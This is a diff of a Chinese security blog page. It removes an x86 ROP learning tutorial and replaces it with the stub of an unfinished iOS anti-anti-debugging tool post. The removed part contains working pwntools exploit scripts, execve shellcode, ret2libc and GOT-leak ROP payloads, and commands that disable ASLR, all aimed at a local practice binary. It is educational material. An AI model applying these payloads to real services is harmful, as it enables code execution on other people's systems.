@@ -94,7 +94,7 @@
 
 
 
-  <meta name="keywords" content="pwn," />
+  <meta name="keywords" content="iOS,MachO,Tweak," />
 
 
 
@@ -107,25 +107,16 @@
 
 
 
-<meta name="description" content="这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。">
+<meta name="description" content="之前有写过针对iOS反调试的及其绕过的分析文章，动态绕过iOS内联svc反调试，本篇主要分享一下自己集成的一款方便绕过反调试的工具。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习rop之x86篇">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习rop之x86篇/index.html">
+<meta property="og:title" content="AntiAntiDebug助手">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2021/06/28/AntiAntiDebug助手/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。">
-<meta property="og:image" content="http://p1.bqimg.com/567571/4e8b1d7f01ef6a38.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/5134a5b537aa2d73.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/fadaebd3da23a2e0.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/dc30b05d3c9ad4ba.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/6448270ab01e52b6.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/c0f9f3cc460b2922.png">
-<meta property="og:image" content="http://i1.piimg.com/567571/e6d4d1d7b8b7e1ed.png">
-<meta property="og:image" content="http://i1.piimg.com/567571/4b23913d36d0894b.png">
-<meta property="og:updated_time" content="2020-04-27T08:35:07.563Z">
+<meta property="og:description" content="之前有写过针对iOS反调试的及其绕过的分析文章，动态绕过iOS内联svc反调试，本篇主要分享一下自己集成的一款方便绕过反调试的工具。">
+<meta property="og:updated_time" content="2021-06-28T09:39:14.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习rop之x86篇">
-<meta name="twitter:description" content="这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。">
-<meta name="twitter:image" content="http://p1.bqimg.com/567571/4e8b1d7f01ef6a38.png">
+<meta name="twitter:title" content="AntiAntiDebug助手">
+<meta name="twitter:description" content="之前有写过针对iOS反调试的及其绕过的分析文章，动态绕过iOS内联svc反调试，本篇主要分享一下自己集成的一款方便绕过反调试的工具。">
 
 
 
@@ -155,13 +146,13 @@
 
 
 
-  <link rel="canonical" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习rop之x86篇/"/>
+  <link rel="canonical" href="http://yunnigu.dropsec.xyz/2021/06/28/AntiAntiDebug助手/"/>
 
 
 
 
 
-  <title>pwn学习rop之x86篇 | YungGong</title>
+  <title>AntiAntiDebug助手 | YungGong</title>
   
 
 
@@ -322,7 +313,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习rop之x86篇/">
+    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2021/06/28/AntiAntiDebug助手/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yun">
@@ -339,7 +330,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn学习rop之x86篇</h1>
+          <h1 class="post-title" itemprop="name headline">AntiAntiDebug助手</h1>
         
 
         <div class="post-meta">
@@ -351,8 +342,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-19T12:55:41+08:00">
-                2016-11-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-28T16:56:14+08:00">
+                2021-06-28
               </time>
             
 
@@ -367,8 +358,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-04-27T16:35:07+08:00">
-                2020-04-27
+              <time title="更新于" itemprop="dateModified" datetime="2021-06-28T17:39:14+08:00">
+                2021-06-28
               </time>
             
           </span>
@@ -406,163 +397,14 @@
       
 
       
-        <p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br><a id="more"></a></p>
-<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>在说ROP之前，先来说一下什么是缓冲区溢出漏洞。缓冲区溢出漏洞（buffer overflow）是当今软件系统最主要的安全漏洞，利用缓冲区溢出漏洞的攻击也是攻击者最常用的攻击方式之一。所谓缓冲区溢出，是指在应用程序或者系统程序的内存中写入超长数据，从而达到恶意改变或者控制程序执行流程的目的。攻击者通过缓冲区溢出把shellcode写入程序的内存空间，并且通过覆盖栈上函数的返回地址，即EIP寄存器所指向的内存地址的值，或者覆盖SEH链表来实现程序执行流程的控制，使得植入内存的shellcode得以执行。</p>
-<p>栈溢出（stack-based buffer overflows）算是安全界常见的漏洞。一方面因为程序员的疏忽，使用了 strcpy、sprintf等不安全的函数，增加了栈溢出漏洞的可能。另一方面，因为栈上保存了函数的返回地址等信息，因此如果攻击者能任意覆盖栈上的数据，通常情况下就意味着他能修改程序的执行流程，从而造成更大的破坏。</p>
-<p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
-<p>所谓ROP，简单的说就是把原来已经存在的代码块拼接起来，拼接的方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。</p>
-<p>在一般程序里面，都包含着大量的返回指令（ret），他们基本位于函数的尾部，或是函数中部需要返回的地方。而从函数开始的地方到ret指令之间的这一段序列称为二进制指令代码块（gadgets）。这些二进制指令序列使其组合成完成一些诸如读写内存、算术逻辑运算、控制流程跳转、函数调用等操作。于是，我们就可以通过利用内存空间中各个gadgets以某种顺序执行，达到进行任意操作的目的。而为了使各个gadgets“拼接”起来，我们就需要构造一个特殊的返回栈。首先让指向我们构造的栈（stack）的指针跳到gadget A中，执行其中的代码序列后ret回我们的stack中，然后下一步是跳到gadget B，执行后就到gadgets C……只要stack足够大，就能达到我们想要的效果。</p>
-<h2 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h2><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。（详细了解可以去看我的另一篇博客<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">checksec及其包含的保护机制</a>）我们这些初学的菜鸟先一步一步来，之后再加上各种防御措施，接着再学习绕过方法，所谓循序渐进嘛。。。</p>
-<p>首先来看看我们要用的简单的缓冲区溢出例子：</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-
-void vulnerable_function() {
-    char buf[128];
-    read(STDIN_FILENO, buf, 256);
-}
-
-int main(int argc, char** argv) {
-    vulnerable_function();
-    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
-}
-</code></pre><p>注意这个例子需要在32位的liunx系统下编译，学64位的时候在64位系统下编译。我们使用如下命令编译它：</p>
-<pre><code>gcc -fno-stack-protector -z execstack -o test1 test.    
-</code></pre><p>这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。同时我们在shell中执行：</p>
-<pre><code>sudo -s 
-echo 0 &gt; /proc/sys/kernel/randomize_va_space
-exit
-</code></pre><p>这几个指令。执行完后我们就关掉整个linux系统的ASLR保护。</p>
-<p>接下来我们开始对目标程序进行分析。首先我们先来确定溢出点的位置，这里我推荐使用gdb插件peda自带的pattern这个脚本来进行计算。我们使用如下命令：</p>
-<p><img src="http://p1.bqimg.com/567571/4e8b1d7f01ef6a38.png" alt=""></p>
-<p>之后使用gdb调试</p>
-<p><img src="http://p1.bqimg.com/567571/5134a5b537aa2d73.png" alt=""><br>这里我们可以得到内存出错地址为0x41416d41.之后使用命令：</p>
-<p><img src="http://p1.bpimg.com/567571/fadaebd3da23a2e0.png" alt=""></p>
-<p>就可以非常容易的计算出PC返回值的覆盖点为140个字节。我们只要构造一个”A”*140+ret字符串，就可以让pc执行ret地址上的代码了。</p>
-<p>之后就是生成一段shellcode可以在网上找现成的，也可以使用msf生成。作为一个初学者，shellcode的地址并不好找，因为gdb调试的时候会影响buf在内存中的地址，蒸米大神推介了一个好的方法：</p>
-<p>开去core dump 这个功能。</p>
-<pre><code>ulimit -c unlimited
-sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;
-</code></pre><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
-<p><img src="http://p1.bqimg.com/567571/dc30b05d3c9ad4ba.png" alt=""></p>
-<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xfff66bfd。</p>
-<p>OK，现在溢出点，shellcode和返回值地址都有了，可以开始写exp了。</p>
-<p>最终本地测试代码如下：</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-
-p = process(&apos;./test&apos;) 
-ret =0xfff66bfd 
-
-shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
-shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
-shellcode += &quot;\x0b\xcd\x80&quot;
-
-# p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) 
-#对ret进行编码，将地址转换成内存中的二进制存储形式
-payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)
-
-p.send(payload) #发送payload
-
-p.interactive()  #开启交互shell
-</code></pre><p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
-<pre><code>socat TCP4-LISTEN:10001,fork EXEC:./level1
-</code></pre><p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
-<p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！</p>
-<h2 id="0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h2><p>现在我们把DEP打开，依然关闭stack protector和ASLR。编译方法如下：</p>
-<pre><code>gcc -fno-stack-protector -o test2 test.c
-</code></pre><p>我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
-<pre><code>$ gdb ./test2
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-….
-(gdb) break main
-Breakpoint 1 at 0x8048430
-(gdb) run
-Starting program: /home/mzheng/CTF/groupstudy/test/test2 
-
-Breakpoint 1, 0x08048430 in main ()
-(gdb) print system
-$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
-(gdb) print __libc_start_main
-$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
-(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到)
-0xb7f81ff8
-warning: Unable to access target memory at 0xb7fc8500, halting search.
-1 pattern found.
-(gdb) x/s 0xb7f81ff8
-0xb7f81ff8:  &quot;/bin/sh&quot;
-</code></pre><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-
-p = process(&apos;./level2&apos;)
-#p = remote(&apos;127.0.0.1&apos;,10002)
-
-ret = 0xdeadbeef
-systemaddr=0xb7e5f460
-binshaddr=0xb7f81ff8
-
-payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
-
-p.send(payload)
-
-p.interactive()
-</code></pre><h2 id="ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h2><p>接下来我们打开ASLR保护。</p>
-<pre><code>sudo -s 
-echo 2 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre><p>从现在开始会发现test的libc.so的地址每次都会变化。</p>
-<p>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。</p>
-<p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
-<p><img src="http://p1.bqimg.com/567571/6448270ab01e52b6.png" alt=""></p>
-<p><img src="http://p1.bqimg.com/567571/c0f9f3cc460b2922.png" alt=""></p>
-<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。</p>
-<p>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p>
-<p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
-<p><img src="http://i1.piimg.com/567571/e6d4d1d7b8b7e1ed.png" alt=""></p>
-<p>最后的exp：</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-
-libc = ELF(&apos;libc.so&apos;)
-elf = ELF(&apos;test3&apos;)
-
-p = process(&apos;./test3&apos;)
-#p = remote(&apos;127.0.0.1&apos;, 10003)
-
-plt_write = elf.symbols[&apos;write&apos;]
-print &apos;plt_write= &apos; + hex(plt_write)
-got_write = elf.got[&apos;write&apos;]
-print &apos;got_write= &apos; + hex(got_write)
-vulfun_addr = 0x0804844d
-print &apos;vulfun= &apos; + hex(vulfun_addr)
-
-payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)
-
-print &quot;\n###sending payload1 ...###&quot;
-p.send(payload1)
-
-print &quot;\n###receving write() addr...###&quot;
-write_addr = u32(p.recv(4))
-print &apos;write_addr=&apos; + hex(write_addr)
-
-print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
-system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
-print &apos;system_addr= &apos; + hex(system_addr)
-binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
-print &apos;binsh_addr= &apos; + hex(binsh_addr)
-
-payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
-
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-
-p.interactive()
-</code></pre><p><img src="http://i1.piimg.com/567571/4b23913d36d0894b.png" alt=""></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要介绍了x86——ROP攻击的基本原理,希望能帮到大家</p>
+        <p>之前有写过针对iOS反调试的及其绕过的分析文章，<a href="https://yunnigu.dropsec.xyz/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/">动态绕过iOS内联svc反调试</a>，本篇主要分享一下自己集成的一款方便绕过反调试的工具。<br><a id="more"></a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="反调试相关技术参考"><a href="#反调试相关技术参考" class="headerlink" title="反调试相关技术参考"></a>反调试相关技术参考</h3><p><a href="http://bbs.iosre.com/t/topic/9351" target="_blank" rel="external">反调试与绕过的奇淫技巧</a><br><a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a></p>
+<h3 id="相关知识储备"><a href="#相关知识储备" class="headerlink" title="相关知识储备"></a>相关知识储备</h3><pre><code>MochO文件结构
+dyld链接加载流程
+iOS inline Hook
+Preferenceloader，applist模块集成
+</code></pre><p>之前对反调试的绕过一般都是采用针对对应APP编写Hook插件来绕过反调试，或者是启动调试定位反调试点，修改寄存器nop汇编指令进行绕过，<br>前几天在使用RevealLoader的过程中，看到其下图界面，突发奇想是否可以开发一个通用的插件，选中某个APP即可绕过其反调试，不再需要逐个分析APP的反调试的反调试点，于是通过之前对反调试的一些积累集成了本工具。</p>
+<p>## </p>
 
       
     </div>
@@ -609,7 +451,11 @@ p.interactive()
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
+            <a href="/tags/iOS/" rel="tag"># iOS</a>
+          
+            <a href="/tags/MachO/" rel="tag"># MachO</a>
+          
+            <a href="/tags/Tweak/" rel="tag"># Tweak</a>
           
         </div>
       
@@ -622,8 +468,8 @@ p.interactive()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/11/08/pwn第一更-Icectf-drumpfhotel/" rel="next" title="pwn第一更-Icectf_drumpfhotel">
-                <i class="fa fa-chevron-left"></i> pwn第一更-Icectf_drumpfhotel
+              <a href="/2021/06/17/Ubuntu16-04编译Android源码/" rel="next" title="Ubuntu16.04编译Android源码">
+                <i class="fa fa-chevron-left"></i> Ubuntu16.04编译Android源码
               </a>
             
           </div>
@@ -631,10 +477,6 @@ p.interactive()
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/11/19/pwn学习之DynELF的使用/" rel="prev" title="pwn学习之DynELF的使用">
-                pwn学习之DynELF的使用 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -715,7 +557,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">40</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -728,7 +570,7 @@ p.interactive()
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -806,7 +648,7 @@ p.interactive()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#序"><span class="nav-number">1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Control-Flow-Hijack-程序流劫持"><span class="nav-number">2.</span> <span class="nav-text">Control Flow Hijack 程序流劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><span class="nav-number">3.</span> <span class="nav-text">0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><span class="nav-number">4.</span> <span class="nav-text">ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">5.</span> <span class="nav-text">小结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反调试相关技术参考"><span class="nav-number">1.1.</span> <span class="nav-text">反调试相关技术参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关知识储备"><span class="nav-number">1.2.</span> <span class="nav-text">相关知识储备</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -826,7 +668,7 @@ p.interactive()
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2021-06-21</span>
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2021-06-28</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
